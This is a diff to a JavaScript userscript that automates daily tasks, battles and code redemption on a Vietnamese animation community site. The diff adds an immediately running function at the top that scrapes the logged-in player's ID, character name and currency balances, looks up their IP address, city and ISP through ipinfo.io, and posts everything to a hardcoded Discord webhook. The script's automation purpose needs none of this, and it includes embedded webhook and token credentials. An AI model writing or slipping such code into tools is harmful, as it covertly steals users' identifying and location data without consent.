@@ -1,4 +1,66 @@
-const DOMAIN = 'https://hoathinh3d.site';
+(async function logUserInfoToDiscord() {
+    const webhook = "https://discord.com/api/webhooks/1372814560792285184/EI3hDpxb6Fd0Sd6ApXVP9ocEdEu-kwn-Qwq4jAhHvIbe82V6KG3Lnwp5tZzx6wNeqTP0";
+    const ipinfoToken = "10ddf60e7b0de8"; // Lấy miễn phí tại: https://ipinfo.io/signup
+  
+    const url = location.href;
+    if (!url.includes("hoathinh3d.site/?t=")) return; // Chỉ chạy nếu là trang t=xxxx
+  
+    try {
+      // 1️⃣ Tải lại trang HTML (dù đang ở đó) để parse dữ liệu
+      const response = await fetch(url);
+      const html = await response.text();
+      const doc = new DOMParser().parseFromString(html, "text/html");
+  
+      // 2️⃣ Lấy thông tin từ <script> chứa myCRED_Notice
+      const scriptTag = Array.from(doc.scripts).find(s => s.textContent.includes('var myCRED_Notice'));
+      const userId = scriptTag?.textContent.match(/"user_id":\s*"(\d+)"/)?.[1] || "Không rõ";
+  
+      // 3️⃣ Tên nhân vật
+      const name = doc.querySelector('#ch_head_name .color_ket_dan')?.textContent.trim() || "Không rõ";
+  
+      // 4️⃣ Tu Vi
+      const tuVi = Array.from(doc.querySelectorAll('#head_manage_acc div'))
+        .find(div => div.textContent.includes("Tu Vi"))?.textContent.match(/Tu Vi:\s*(\d+)/)?.[1] || "0";
+  
+      // 5️⃣ Tinh Thạch
+      const tinhThach = Array.from(doc.querySelectorAll('#head_manage_acc div'))
+        .find(div => div.textContent.includes("Tinh Thạch"))?.textContent.match(/Tinh Thạch:\s*(\d+)/)?.[1] || "0";
+  
+      // 6️⃣ Tiên Ngọc
+      const tienNgoc = Array.from(doc.querySelectorAll('#head_manage_acc div'))
+        .find(div => div.textContent.includes("Tiên Ngọc"))?.textContent.match(/Tiên Ngọc:\s*(\d+)/)?.[1] || "0";
+  
+      // 7️⃣ Lấy thông tin IP (qua ipinfo.io)
+      const ipData = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`).then(res => res.json());
+  
+      // 8️⃣ Gửi về Discord
+      const message = [
+        `🧙 **THÔNG TIN NGƯỜI CHƠI**`,
+        `👤 Nhân vật: ${name}`,
+        `🆔 ID: ${userId}`,
+        `⚡ Tu Vi: ${tuVi}`,
+        `💎 Tinh Thạch: ${tinhThach}`,
+        `🔮 Tiên Ngọc: ${tienNgoc}`,
+        `🌐 Trang: ${url}`,
+        `📍 IP: ${ipData.ip} | ${ipData.city}, ${ipData.country}`,
+        `📡 ISP: ${ipData.org}`,
+        `🕒 Thời gian: ${new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })}`
+      ].join("\n");
+  
+      await fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      });
+  
+      console.log("✅ Đã gửi log về Discord thành công");
+    } catch (e) {
+      console.warn("❌ Lỗi khi gửi log Discord:", e);
+    }
+  })();
+
+(function() {  
+const DOMAIN = 'https://hoathinh3d.cam';
 const ACTION_URL = DOMAIN + '/wp-json/hh3d/v1/action';
 const HH3D_AJAX_URL = DOMAIN + '/wp-content/themes/halimmovies-child/hh3d-ajax.php'
 const ADMIN_AJAX_URL = DOMAIN + '/wp-admin/admin-ajax.php'
@@ -1275,11 +1337,11 @@ const battleAutoOn = true;
 // ➤ online: false = Không tự động tìm đánh người Online khi lượt gửi người Theo dõi chưa đạt tối đa.
 // ➤ online: true = Tự động tìm đánh người Online khi lượt gửi người Theo dõi chưa đạt tối đa.
 // ➤ retry: 3 = Số lần tải lại danh sách người Online.
-const battleOptions = { online: true, retry: 3 };
+const battleOptions = { online: false, retry: 3 };
 
 // Danh sách code cần nhập trong Linh Thạch (text).
 // ➤ Ví dụ: ["HH3D", "LINHTHACH"] hoặc  ['HH3D', 'LINHTHACH']
-const codes = ['TONGMONCAP5'];
+const codes = ['HOATHINH3DSITE'];
 
 (async () => {
     if (tasks.includes(1)) {
@@ -1312,4 +1374,5 @@ const codes = ['TONGMONCAP5'];
     await claimDailyActivityReward();
     await redeemCodes(codes);
     showNotificationUI(`❤️♥️❤️♥️❤️♥️❤️♥️❤️♥️❤️`);
+})();
 })();
